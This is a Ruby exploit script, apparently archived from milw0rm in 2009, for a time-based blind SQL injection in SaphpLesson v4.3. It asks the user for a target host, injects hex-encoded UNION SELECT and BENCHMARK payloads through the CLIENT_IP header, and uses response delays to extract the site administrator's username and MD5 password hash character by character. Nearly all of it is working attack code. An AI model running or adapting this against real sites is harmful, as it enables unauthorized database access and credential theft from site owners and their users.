#!/usr/bin/ruby

#=============================================#
#          SaphpLesson v4.3 Exploit           #
#     Blind SQL Injection Vulnerability       #
#---------------------------------------------#
# Date: 21-08-2009                            #
# Discovered & written by: Jafer Al Zidjali   #
# Email: jafer[at]scorpionds.com              #
# Website: www.scorpionds.com                 #
#---------------------------------------------#
# Notes:                                      #
#       1. Author has been notified           #
#       2. A public patch has been released   #
#=============================================#


require "net/http"
require "base64"

intro=[
          "+=============================================+",
          "+          SaphpLesson v4.3 Exploit           +",
          "+     Blind SQL Injection Vulnerability       +",
          "+  Discovered & written by: Jafer Al Zidjali  +",
          "+        Email: jafer[at]scorpionds.com       +",
          "+         Website: www.scorpionds.com         +",
          "+=============================================+"
          ]

def print_intro text
  w="|"
  text.each do |str|
    str.scan(/./) do |c|
        STDOUT.flush
      if w=="|" 
        print "\b"+c +w
        w="/"
      elsif w=="/" 
        print "\b"+c +w
        w="-"  
      elsif w=="-" 
        print "\b"+c +w
        w="\\" 
      else
      print "\b"+c +w
      w="|"
      end
      sleep 0.04
    end
    print "\b "
    puts ""
  end
end

print_intro intro

puts "\nEnter host name (e.g. example.com):"
host=gets.chomp

puts "\nEnter script path (e.g. /saphplesson/):"
path=gets.chomp


puts "\nGetting average response time..."

avgTime=Array.new(5)

5.times do |c|
  s=Time.now
  http = Net::HTTP.new(host, 80)
  resp= http.get(path)
  w=resp.body
  avgTime[c]=Time.now-s
  puts avgTime[c]
end

sum=0
5.times {|c| sum+=avgTime[c]}
avg=sum/5.0
puts "Average response time is: #{avg*3.0}"

puts "\nTesting delayed response time..."
delTime=Array.new(5)

5.times do |t|
  delay=1000000*((t+1)*10)
  header={
  "CLIENT_IP" =>  "\x27\x20\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43\x54"+
                  "\x20\x49\x46\x28\x31\x3d\x31\x2c\x42\x45\x4e\x43\x48\x4d"+
                  "\x41\x52\x4b\x28#{delay}\x2c\x63\x68\x61\x72\x28\x63\x68"+
                  "\x61\x72\x28\x32\x29\x29\x29\x2c\x33\x34\x33\x34\x29\x20\x23\x20"
  }
  s=Time.now
  http = Net::HTTP.new(host, 80)
  resp= http.get(path,header)
  w=resp.body
  s=Time.now-s
  delTime[t]=delay
  puts "["+(t+1).to_s+"] #{s}"
end

puts "\nChoose a delyed response time (it should be > average response time):"
sel=gets.chomp

print "\nGetting username length"
ulen=0

20.times do |z|
  header={
  "CLIENT_IP" =>  "\x27\x20\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43\x54"+
                  "\x20\x49\x46\x28\x6c\x65\x6e\x67\x74\x68\x28\x28\x73\x65\x6c\x65\x63\x74"+
                  "\x20\x4d\x6f\x64\x4e\x61\x6d\x65\x20\x66\x72\x6f\x6d\x20\x6d\x6f\x64\x72"+
                  "\x65\x74\x6f\x72\x20\x77\x68\x65\x72\x65\x20\x4d\x6f\x64\x49\x44\x3d\x31"+
                  "\x29\x29\x3d#{z+1}\x2c\x42\x45\x4e\x43\x48\x4d\x41\x52\x4b\x28#{delTime[(sel.to_i)-1]}"+
                  "\x2c\x63\x68\x61\x72\x28\x63\x68\x61\x72\x28\x32\x29\x29\x29\x2c\x33\x34\x33\x34\x29\x20\x23\x20"
  }
  s=Time.now
  http = Net::HTTP.new(host, 80)
  resp= http.get(path,header)
  w=resp.body
  s=Time.now-s
  print "."
    if (s>(avg*3.0))
      ulen=z+1
      break;
    end
  STDOUT.flush
end

puts "\n\nUsername length: "+ ulen.to_s

puts "\n\nUsername: "
chars="abcdefghijklmnopqrstuvwxyz0123456789"

ulen.times do |z|
  chars.scan(/./) do |c|
    header={
    "CLIENT_IP" => "\x27\x20\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43"+
    "\x54\x20\x49\x46\x28\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x28\x73"+
    "\x65\x6c\x65\x63\x74\x20\x4d\x6f\x64\x4e\x61\x6d\x65\x20\x66\x72\x6f"+
    "\x6d\x20\x6d\x6f\x64\x72\x65\x74\x6f\x72\x20\x77\x68\x65\x72\x65\x20"+
    "\x4d\x6f\x64\x49\x44\x3d\x31\x29\x2c#{z+1}\x2c\x31\x29\x3d\x27#{c}\x27"+
    "\x2c\x42\x45\x4e\x43\x48\x4d\x41\x52\x4b\x28#{delTime[(sel.to_i)-1]}"+
    "\x2c\x63\x68\x61\x72\x28\x63\x68\x61\x72\x28\x32\x29\x29\x29\x2c\x33"+
    "\x34\x33\x34\x29\x20\x23\x20"
    }
    s=Time.now
    http = Net::HTTP.new(host, 80)
    resp= http.get(path,header)
    w=resp.body
    s=Time.now-s
    print c
      if (s>(avg*3.0))
        break;
      end
    print "\b"
    STDOUT.flush
  end
end

puts "\n\nPassword hash: "
chars="0123456789abcdef"

32.times do |z|
  chars.scan(/./) do |c|
    header={
    "CLIENT_IP" => "\x27\x20\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43\x54"+
    "\x20\x49\x46\x28\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x28\x73\x65\x6c"+
    "\x65\x63\x74\x20\x4d\x6f\x64\x50\x61\x73\x73\x77\x6f\x72\x64\x20\x66\x72"+
    "\x6f\x6d\x20\x6d\x6f\x64\x72\x65\x74\x6f\x72\x20\x77\x68\x65\x72\x65\x20"+
    "\x4d\x6f\x64\x49\x44\x3d\x31\x29\x2c#{z+1}\x2c\x31\x29\x3d\x27#{c}\x27\x2c"+
    "\x42\x45\x4e\x43\x48\x4d\x41\x52\x4b\x28#{delTime[(sel.to_i)-1]}"+
    "\x2c\x63\x68\x61\x72\x28\x63\x68\x61\x72\x28\x32\x29\x29\x29\x2c\x33\x34"+
    "\x33\x34\x29\x20\x23\x20"
    }
    s=Time.now
    http = Net::HTTP.new(host, 80)
    resp= http.get(path,header)
    w=resp.body
    s=Time.now-s
    print c
      if (s>(avg*3.0))
        break;
      end
    print "\b"
    STDOUT.flush
  end
end

# milw0rm.com [2009-09-16]